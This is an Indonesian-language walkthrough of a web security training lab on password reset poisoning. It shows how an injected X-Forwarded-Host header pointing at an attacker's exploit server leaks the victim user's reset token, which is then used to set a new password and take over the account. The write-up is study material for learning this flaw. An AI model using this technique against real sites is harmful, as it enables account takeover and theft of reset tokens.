LAB 2 Password reset poisoning via middleware

Brief:
	lab rentan dengan password poisoning, user carlos akan mengklik semua email yang dia terima.
	
	credentials: wiener:peter
	
Tujuan:
	login ke akun carlos
	
Analisa:
	Untuk memudahkan dan memahami ikuti workflow dari login, logout, dan reset akun
	
		step:
		
			A. Ini request Post login untuk login akun
			
			B. setelah login ini adalah laman dan request GET my-account
			
			C. Ini GET request untuk logout

			D. ini request GET untuk mereset tombol forgot-password

			E. ini request POST untuk mereset akun dengan username
			
			F. ini request GET temp token forgot password
			
				setelah mengklik email untuk mereset akun nanti ada temp token yang akan dimuat, token inilah yang digunakan untu mengganti sandi.
				
			G. request POST forgot-password?temp-forgot-password-token ini untuk mereset akun dengan mengisi kata sandinya

	Jadi workflow untuk mereset password seperti ini:
		
			- user mengklik dan mengirim request GET /forgot-password
			
				setelah itu
				
			- user mengisi dengan username atau email akunnya, lalu mengirim request POST /forgot-password dengan parameter username
			
			situs web akan mengirim link yang berisi token unik ke email user. setelah di klik
			
			- user akan mengirim request GET /forgot-password?temp-forgot-password-token=TOKEN 
			
			- lalu user akan mengisi password baru dengan request POST /forgot-password?temp-forgot-password-token=TOKEN
			
				dan parameter: temp-forgot-password-token=TOKEN&new-password-1=passwordbaru&new-password-2=passwordbaru
			
			dan seperti itulah workflownya
		
	kerentanan:
	
		1. pada POST request di step (E) untuk mereset akun dengan request : POST /forgot-password dengan parameter username:
		
			cek bahwa X-Forwarded-Host disupport diheader dengan url yang ada di exploit server
		
			tambahkan X-Forwarded-Host: exploit.server
			
			lalu di akses log ada request yang dikirim ke server
		
		2. sekarang kirim lagi requestnya dan ganti parameter username dengan username carlos: username=carlos
		
			lalu ke akses log dan ada request dari akun carlos GET /forgot-password?temp-forgot-password-token=TOKEN
		
				ini bisa terjadi karna carlos mengklik email yang dia terima untuk mereset password tanpa mengetahui bahwa attacker juga bisa menerima token untuk mereset password
				
				karna request X-Forwarded-Host mengarah ke server attacker
				
			copy tokennya
		
		3. load request step (G) GET /forgot-password?temp-forgot-password-token=TOKEN dengan token yang di copy sebelumnnya
		
		4. ke step(G) atau kerequest yang digunakan untuk mereset password dengan parameter password barunya: POST /forgot-password?temp-forgot-password-token=TOKEN
														      
												       dan parameter: temp-forgot-password-token=TOKEN&new-password-1=passwordbaru&new-password-2=passwordbaru
		
			ganti kedua parameter token dengan token carlos dan isi password baru lalu kirim request
			
			dan status 302 found
			
		5. login dengan akun carlos dan password barunya lalu berhasil
